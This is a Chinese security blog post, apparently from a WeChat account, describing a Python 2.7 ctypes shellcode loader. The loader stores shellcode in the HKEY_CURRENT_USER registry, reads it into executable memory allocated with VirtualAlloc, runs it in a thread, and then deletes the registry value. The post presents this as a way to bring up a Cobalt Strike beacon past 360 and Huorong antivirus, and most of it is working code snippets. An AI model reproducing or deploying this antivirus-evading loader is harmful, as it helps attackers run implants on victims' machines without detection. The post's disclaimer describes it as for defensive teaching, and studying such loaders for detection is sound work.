> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZbRG7SGZxCucpQI7cmeDbg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8gPjAL4EpmW03fg3nVwwzDGvuUvvX8kstOfKfMzmpPrv8hkuf1bbef5g/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

最近毕业了，开始了新的打工生活，知识也被榨干了，更新比较慢

**前言**  

前几天不是发了几个《[UUID、MAC、ipv4](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247485833&idx=1&sn=82c2f120b6c5058dc9afcc4eeefb89b5&chksm=97743568a003bc7e9e62e90d2353ecb17c2761a492b494417290b85e7fd39a8da3d9c5d6d249&scene=21#wechat_redirect)》等加载器吗，这几个原理都一个样，就是转换内容然后写到内存中去，说白了只要能往内存写东西的函数都能写成加载器

这几天研究 api 操作注册表想绕过 360 等，突然想起注册表是可以存储二进制内容的，然后就发现了 RegQueryValueExA 函数是可以读取 注册表中内容的，所以我们只要将读取的内容存到申请的内存中去执行即可。

本文环境使用 py2.7，通过 ctypes 库调用 RegQueryValueExA 函数实现上线 cs

**注册表**

注册表就不多介绍了，乱七八糟的我也讲不懂，自己百度  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8g0effAg74GKHA03ThAl9QWZic3LKEibVMUFWPjHw5p0ddXcAcyYWk3Bhg/640?wx_fmt=png)

但主要一点，我们操作注册表是需要权限的，但 HKLM_CURRWNT_USER 表是不需要权限的，所以我们主要操作这个表  

**函数介绍**

在读取注册表内容之前，注册表得有我们的 shellcode 内容啊，命令行操作 reg 又不行，拦的死死地，所以只能用 api 进行写入我们的 shellcode  

RegSetValueExA

该函数在 Advapi32.dll 库中，可以设置注册表项下指定值的数据和类型。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
```

```
LSTATUS RegSetValueExA(
  HKEY       hKey,
  LPCSTR     lpValueName,
  DWORD      Reserved,
  DWORD      dwType,
  const BYTE *lpData,
  DWORD      cbData
);
```

hKey 为上面五个表其中一种，这里操作 HKLM_CURRWNT_USER，在 py 里对应值是 - 2147483647  

lpValueName 是在表里新建一个值

dwType 是值的类型，在注册表里不同的值类型储存不同格式的数据，我们需要储存二进制数据，所以值类型为 REG_BINARY，py 里对应数值为 3

lpData 这是我们需要写入的数据，这里写入 shellcode

cbData 是数据的大小，必须将 shellcode 全部写入

```
buf = b"\xfc\x00..."
ctypes.windll.Advapi32.RegSetValueExA(-2147483647, "test", None, 3, buf,len(buf))
```

此时看看注册表里的内容是不是 shellcode  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8gs79rtb3luibicK2g7vyOdR2FTQP2SBz9Roicj2Fp6TfhHvESMzDzTDNBw/640?wx_fmt=png)

RegQueryValueExA  

该函数在 Advapi32.dll 库中，检索与打开的注册表项关联的指定值名称的类型和数据。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa
```

```
LSTATUS RegQueryValueExA(
  HKEY    hKey,
  LPCSTR  lpValueName,
  LPDWORD lpReserved,
  LPDWORD lpType,
  LPBYTE  lpData,
  LPDWORD lpcbData
);
```

hKey 对应上面注册表的组  

lpValueName 对应上面值的名称

lpType 接收查到的值的类型，可以为 0 表示不需要此内容

lpData 则接收我们查到的值的数据，也就是我们的 shellcode，这里需要 VirtualAlloc 申请一块内存来接收此数据，这里根据需要的指针类型将内存改为 LPBYTE 的指针

```
LPBYTE = POINTER(c_byte)
ctypes.windll.kernel32.VirtualAlloc.restype = LPBYTE
ptr = ctypes.windll.kernel32.VirtualAlloc(0,800,0x3000,0x40)
```

lpcbData 则是 shellcode 的长度，这里长度我们需要先执行一下 RegQueryValueExA 来获取一下 shellcode 长度，然后继续直接 RegQueryValueExA 来去读内容到申请的内存  

```
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "test", 0, 0, 0, byref(data_len))
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647,"test",0,None,ptr,byref(data_len))
```

这时 shellcode 已经写入到内存中去了，继续老一套创建线程运行即可  

当写完内存，以防万一将写入的注册表进行删除

```
ctypes.windll.Advapi32.RegDeleteValueA(-2147483647, "test")
```

测试

环境 py2.7 , 使用 cs 生成 64 位 shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPQdnFLNBOibeibWcF6a35v8gC9PuaOyTdNCoVNyVtAfQEs0doicIC30DaYA5v9z3Y8Esn7FDldFh1FA/640?wx_fmt=png)

这里测试了火绒，360，成功上线

公众号

源码公众号回复：**注册表加载器**